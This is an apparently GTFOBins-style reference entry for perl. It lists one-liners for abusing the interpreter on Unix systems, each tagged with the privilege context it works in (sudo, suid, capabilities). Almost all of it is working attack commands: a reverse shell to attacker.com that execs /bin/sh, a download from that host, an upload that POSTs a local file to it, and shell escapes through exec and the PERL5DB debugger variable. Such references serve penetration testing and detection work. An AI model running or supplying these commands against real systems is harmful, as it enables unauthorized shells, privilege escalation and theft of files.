---
type: gtfobin
name: perl
platform: Unix
functions: [download, file-read, reverse-shell, shell, upload]
tags: [gtfobin, unix, lotl]
---

# perl

## download

```bash
perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>"attacker.com",PeerPort=>80,Proto=>"tcp") or die; print $s "GET /path/to/input-file HTTP/1.1\r\nHost: attacker.com\r\nMetadata: true\r\nConnection: close\r\n\r\n"; open(my $fh, ">", "/path/to/output-file") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq "\r\n") { $in_content = 1; } } close($s); close($fh);'
```
**Contexts:** sudo, unprivileged

## file-read

```bash
perl -ne print /path/to/input-file
```
**Contexts:** sudo, suid, unprivileged

## reverse-shell

```bash
perl -e 'use Socket;$i="attacker.com";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
**Contexts:** sudo, unprivileged

## shell

```bash
perl -e 'exec "/bin/sh"'
```
**Contexts:** capabilities, sudo, unprivileged

```bash
PERL5OPT=-d PERL5DB='exec "/bin/sh"' perl /dev/null
```
_The `/dev/null` part can be omitted, just use `Ctrl-D` in order to spawn the shell._
**Contexts:** sudo, unprivileged

## upload

```bash
perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>"attacker.com", PeerPort=>80, Proto=>"tcp") or die;open(my $file, "<", "/path/to/input-file") or die;$content = join("", <$file>);close($file);$headers = "POST / HTTP/1.1\r\nHost: attacker.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " . length($content) . "\r\nConnection: close\r\n\r\n";print $s $headers . $content;while (<$s>) { }close($s);'
```
**Contexts:** sudo, unprivileged
